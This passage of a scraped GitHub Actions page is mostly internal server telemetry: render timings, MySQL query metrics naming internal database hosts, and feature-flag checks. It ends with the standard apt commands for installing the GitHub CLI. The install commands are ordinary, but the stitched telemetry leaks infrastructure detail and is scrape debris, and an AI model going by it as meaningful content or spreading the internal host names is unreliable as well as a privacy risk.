"logged_in:true", "partial:layouts/repository/default_container/show_abuse_banner"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/show_abuse_banner", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/show_abuse_banner", "rpc_store:mysql"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/successor_prompt_popular_repositories"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/successor_prompt_popular_repositories", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/successor_prompt_popular_repositories", "rpc_store:mysql"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/is_spammy_banner"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/is_spammy_banner", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/is_spammy_banner", "rpc_store:mysql"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:stacks_toggle", "result:false"]}], ["rpc.mysql.dist.time", 0.9764810092747211, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:abilities"]}], ["catalog_service.rpc.mysql.dist.time", 0.9764810092747211, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:abilities"]}], ["platform.loaders.dist.time", 1.6310689970850945, {:tags=>["loader:ability_membership_check"]}], ["feature_flags.groups.member_check_latency", 2, {:tags=>["team_name:azure_stacks_collaborators"]}], ["feature_flags.groups.check.latency", 0, {:tags=>["group:github_stars_members", "actor_type:Flipper::Types::Actor"]}], ["feature_flags.groups.check.latency", 0, {:tags=>["group:preview_features", "actor_type:Flipper::Types::Actor"]}], ["flipper.dist.time", 2, {:tags=>["operation:enabled", "feature:stacks_toggle", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:primer_octicon_cache", "result:false"]}], ["rpc.mysql.dist.time", 0.7357539143413305, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:internal_repositories"]}], ["catalog_service.rpc.mysql.dist.time", 0.7357539143413305, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:internal_repositories"]}], ["platform.loaders.dist.time", 1.4379880158230662, {:tags=>["loader:active_record_association", "model:repository"]}], ["rpc.mysql.dist.time", 0.7492700824514031, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:mirrors"]}], ["catalog_service.rpc.mysql.dist.time", 0.7492700824514031, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:mirrors"]}], ["rpc.mysql.dist.time", 1.1070650070905685, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-collab-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repository_clones"]}], ["catalog_service.rpc.mysql.dist.time", 1.1070650070905685, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-collab-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repository_clones"]}], ["platform.loaders.dist.time", 1.688653021119535, {:tags=>["loader:active_record_association", "model:repository"]}], ["request.render.partial", 9, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/title"]}], ["request.render.partial.rpc.queries", 4, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/title", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 3.5685700131580234, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/title", "rpc_store:mysql"]}], ["rpc.mysql.dist.time", 0.8116959361359477, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-collab-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:trade_controls_restrictions"]}], ["catalog_service.rpc.mysql.dist.time", 0.8116959361359477, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-collab-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:trade_controls_restrictions"]}], ["platform.loaders.dist.time", 1.3641009572893381, {:tags=>["loader:active_record_association", "model:user"]}], ["platform.loaders.dist.time", 0.6623729132115841, {:tags=>["loader:active_record_association", "model:user"]}], ["platform.loaders.dist.time", 1.2384250294417143, {:tags=>["loader:prelude"]}], ["rpc.mysql.dist.time", 1.0968310525640845, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repositories"]}], ["catalog_service.rpc.mysql.dist.time", 1.0968310525640845, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:repositories"]}], ["platform.loaders.dist.time", 1.906945020891726, {:tags=>["loader:global_health_files_repository"]}], ["rpc.mysql.dist.time", 1.8286530394107103, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:preferred_files"]}], ["catalog_service.rpc.mysql.dist.time", 1.8286530394107103, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:preferred_files"]}], ["platform.loaders.dist.time", 4.38368902541697, {:tags=>["loader:repository_preferred_files"]}], ["request.render.partial", 8, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/show_sponsor_button"]}], ["request.render.partial.rpc.queries", 3, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/show_sponsor_button", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 3.7371800281107426, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/show_sponsor_button", "rpc_store:mysql"]}], ["rpc.mysql.dist.time", 1.0031569981947541, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:profile_pins"]}], ["catalog_service.rpc.mysql.dist.time", 1.0031569981947541, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:profile_pins"]}], ["rpc.mysql.dist.time", 0.9383609285578132, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:profile_pins"]}], ["catalog_service.rpc.mysql.dist.time", 0.9383609285578132, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:profile_pins"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["request.render.partial", 6, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/pin_component"]}], ["request.render.partial.rpc.queries", 2, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/pin_component", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 1.9415179267525673, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/pin_component", "rpc_store:mysql"]}], ["rpc.mysql.dist.time", 0.998950912617147, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-notifications-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:notification_subscriptions"]}], ["catalog_service.rpc.mysql.dist.time", 0.998950912617147, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-notifications-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:notification_subscriptions"]}], ["rpc.mysql.dist.time", 1.10193295404315, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-notifications-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:notification_thread_type_subscriptions"]}], ["catalog_service.rpc.mysql.dist.time", 1.10193295404315, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-notifications-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:notification_thread_type_subscriptions"]}], ["cap.multiple_target_for_conditional_access.dist", 0.11836900375783443, {:tags=>["location:view", "callback:ActionsController"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:enforce_emu_cap_policy", "result:true"]}], ["cap.filter.operation.dist", 0.21925009787082672, {:tags=>["policy:emu_ownership", "location:view", "callback:ActionsController", "operation:applicable"]}], ["cap.filter.evaluation.dist", 0.4651669878512621, {:tags=>["location:view", "callback:ActionsController"]}], ["rpc.mysql.dist.time", 0.8986149914562702, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-notifications-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:notification_subscriptions"]}], ["catalog_service.rpc.mysql.dist.time", 0.8986149914562702, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-notifications-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:notification_subscriptions"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["rpc.mysql.dist.time", 1.0240980191156268, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:oauth_accesses"]}], ["catalog_service.rpc.mysql.dist.time", 1.0240980191156268, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:oauth_accesses"]}], ["user.uses_mobile_app", 2, {}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["feature_flags.groups.check.latency", 0, {:tags=>["group:preview_features", "actor_type:Flipper::Types::Actor"]}], ["flipper.dist.time", 1, {:tags=>["operation:enabled", "feature:notifyd_label_subscriptions", "result:false"]}], ["feature_flags.groups.check.latency", 0, {:tags=>["group:preview_features", "actor_type:Flipper::Types::Actor"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:notifyd_label_subscriptions", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["request.render.partial", 14, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/notifications_component"]}], ["request.render.partial.rpc.queries", 4, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/notifications_component", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 4.023596877232194, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/notifications_component", "rpc_store:mysql"]}], ["rpc.mysql.dist.time", 1.0765419574454427, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:abilities"]}], ["catalog_service.rpc.mysql.dist.time", 1.0765419574454427, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-iam-abilities-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:abilities"]}], ["rpc.mysql.dist.time", 0.943774008192122, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:users"]}], ["catalog_service.rpc.mysql.dist.time", 0.943774008192122, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:users"]}], ["cap.multiple_target_for_conditional_access.dist", 0.01799606252461672, {:tags=>["location:view", "callback:ActionsController"]}], ["cap.filter.evaluation.dist", 0.1320600276812911, {:tags=>["location:view", "callback:ActionsController"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["request.render.partial", 6, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/fork_button"]}], ["request.render.partial.rpc.queries", 2, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/fork_button", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 2.0203159656375647, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/fork_button", "rpc_store:mysql"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["rpc.mysql.dist.time", 0.8318749023601413, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:stars"]}], ["catalog_service.rpc.mysql.dist.time", 0.8318749023601413, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:stars"]}], ["platform.loaders.dist.time", 1.4192459639161825, {:tags=>["loader:has_starred_check"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["request.render.partial", 8, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/stars_component"]}], ["request.render.partial.rpc.queries", 1, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/stars_component", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.8318749023601413, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/stars_component", "rpc_store:mysql"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/onboarding"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/onboarding", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details/onboarding", "rpc_store:mysql"]}], ["request.render.partial", 43, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details"]}], ["request.render.partial.rpc.queries", 12, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 12.55448570009321, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/details", "rpc_store:mysql"]}], ["rpc.mysql.dist.time", 1.6044459771364927, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:issues"]}], ["catalog_service.rpc.mysql.dist.time", 1.6044459771364927, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:issues"]}], ["rpc.mysql.dist.time", 0.8874060586094856, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:issues"]}], ["catalog_service.rpc.mysql.dist.time", 0.8874060586094856, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:issues"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:runtime_repository", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:runtime_repository", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:runtime_repository", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:runtime_repository", "result:false"]}], ["rpc.mysql.dist.time", 0.8516479283571243, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:projects"]}], ["catalog_service.rpc.mysql.dist.time", 0.8516479283571243, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:projects"]}], ["rpc.mysql.dist.time", 1.160933985374868, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-blanket-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:memex_project_links"]}], ["catalog_service.rpc.mysql.dist.time", 1.160933985374868, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-blanket-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:memex_project_links"]}], ["rpc.mysql.dist.time", 0.9455520194023848, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-blanket-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:memex_project_links"]}], ["catalog_service.rpc.mysql.dist.time", 0.9455520194023848, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-blanket-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:memex_project_links"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:xenia", "result:false"]}], ["rpc.memcached.dist.time", 0, {:tags=>["rpc_operation:get_multi"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:xenia", "result:false"]}], ["request.render.partial", 13, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/underline_nav/body"]}], ["request.render.partial.rpc.queries", 5, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/underline_nav/body", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 5.449985968880355, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/underline_nav/body", "rpc_store:mysql"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/underline_nav/body/actions"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/underline_nav/body/actions", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repositories/underline_nav/body/actions", "rpc_store:mysql"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["request.render.partial", 21, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repository/container_header/navigation"]}], ["request.render.partial.rpc.queries", 5, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repository/container_header/navigation", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 5.449985968880355, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:repository/container_header/navigation", "rpc_store:mysql"]}], ["request.render.partial", 72, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/repository_navigation"]}], ["request.render.partial.rpc.queries", 21, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/repository_navigation", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 21.57304168213159, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/repository_navigation", "rpc_store:mysql"]}], ["rpc.mysql.dist.time", 0.7562109967693686, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:businesses"]}], ["catalog_service.rpc.mysql.dist.time", 0.7562109967693686, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-github-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:businesses"]}], ["request.render.partial", 74, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/container_header", "header_redesign:false"]}], ["request.render.partial.rpc.queries", 22, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/container_header", "header_redesign:false", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 22.329252678900957, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/container_header", "header_redesign:false", "rpc_store:mysql"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/hook_failed"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/hook_failed", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:layouts/repository/default_container/hook_failed", "rpc_store:mysql"]}], ["rpc.mysql.dist.time", 3.6813790211454034, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["catalog_service.rpc.mysql.dist.time", 3.6813790211454034, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["rpc.mysql.dist.time", 3.405015915632248, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["catalog_service.rpc.mysql.dist.time", 3.405015915632248, {:tags=>["rpc_operation:select", "rpc_host:vtgate-mysql-repositories-actions-chk-production.service.iad.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:workflows"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["rpc.mysql.dist.time", 2.587183960713446, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:deployments"]}], ["catalog_service.rpc.mysql.dist.time", 2.587183960713446, {:tags=>["rpc_operation:select", "rpc_host:db-mysql-repositories-ro.service.github.net", "rpc_site:va3-iad", "catalog_service:github/actions", "mysql_table:deployments"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["flipper.dist.time", 0, {:tags=>["operation:enabled", "feature:react_next", "result:false"]}], ["request.render.partial", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:actions/custom_hosted_runners_banner"]}], ["request.render.partial.rpc.queries", 0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:actions/custom_hosted_runners_banner", "rpc_store:mysql"]}], ["request.render.partial.rpc.time", 0.0, {:tags=>["controller:actions", "action:index", "logged_in:true", "partial:actions/custom_hosted_runners_banner", "rpc_store:mysql"]}]]
797 workflow runs
=======
type -p curl >/dev/null || sudo apt install curl -y
curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg \
&& sudo chmod go+r /usr/share/keyrings/githubcli-archive-keyring.gpg \
&& echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null \
&& sudo apt update \
&& sudo apt install gh -y
